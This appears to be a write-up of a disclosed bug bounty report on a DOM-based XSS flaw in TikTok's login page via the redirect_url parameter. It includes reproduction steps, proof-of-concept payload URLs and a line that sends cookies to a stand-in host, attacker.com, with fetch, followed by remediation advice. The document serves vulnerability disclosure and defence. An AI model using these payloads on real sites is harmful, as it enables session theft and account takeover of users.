# Title: DOM XSS in tiktok.com/login via the redirect_url Parameter

- **Platform**: TikTok Bug Bounty
- **Program**: TikTok (HackerOne)
- **Severity**: High
- **Date**: 21 September 2024
- **Researcher**: sh1yo
- **Bounty**: N/A (paid bounty, amount undisclosed)
- **Report**: https://hackerone.com/reports/2583874

## Summary

A DOM-based Cross-Site Scripting (XSS) vulnerability was discovered in the TikTok login page at tiktok.com/login. The `redirect_url` parameter was not properly sanitized before being used in client-side JavaScript, allowing an attacker to inject arbitrary JavaScript that would execute in the victim's browser. This could be leveraged for session theft, credential harvesting, or account takeover via OAuth token theft.

## Technical Details

The login page at `https://www.tiktok.com/login` accepts a `redirect_url` query parameter that determines where the user is redirected after successful authentication. The application uses client-side JavaScript to read this parameter from the URL and inject it into the page DOM without proper validation or encoding.

The vulnerable code flow:
1. The page reads `redirect_url` from the query string
2. The value is decoded and inserted into the DOM via `innerHTML` or similar unsafe DOM manipulation
3. An attacker can craft a URL containing a malicious `redirect_url` parameter with JavaScript event handlers or script tags

## Steps to Reproduce

1. Craft a malicious URL: `https://www.tiktok.com/login?redirect_url=javascript:alert(document.cookie)`
2. Alternatively, use a payload like: `https://www.tiktok.com/login?redirect_url="><script>alert('XSS')</script>`
3. Send the crafted URL to a victim
4. When the victim visits the URL and the page loads, the JavaScript executes in the context of tiktok.com

## Proof of Concept

The following URL demonstrates the vulnerability:

```
https://www.tiktok.com/login?redirect_url="><img src=x onerror=alert(document.domain)>
```

When visited, the `redirect_url` parameter value is injected into the page without proper encoding, causing the `onerror` event handler to execute. The `alert(document.domain)` call would display "tiktok.com", confirming DOM-based XSS execution.

A more impactful payload could steal OAuth tokens from the authentication flow:

```html
https://www.tiktok.com/login?redirect_url="><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

## Impact

- Full account takeover when chained with OAuth token theft
- Session cookie theft leading to account compromise
- Phishing attacks with high credibility (executes on legitimate tiktok.com domain)
- Bypass of SOP (Same-Origin Policy) for data exfiltration
- Potential to target high-value TikTok creator or business accounts

## Remediation

- Properly encode the `redirect_url` parameter before DOM insertion
- Use `textContent` instead of `innerHTML` when inserting user-controlled data
- Implement a URL whitelist for valid redirect destinations
- Validate the `redirect_url` against a strict allowlist server-side
- Add CSP headers to mitigate impact even if XSS occurs

## References

- https://hackerone.com/reports/2583874
- https://www.redpacketsecurity.com/hackerone-bugbounty-disclosure-dom-xss-in-tiktok-com-login-via-the-redirect-url-parameter-sh-yo/
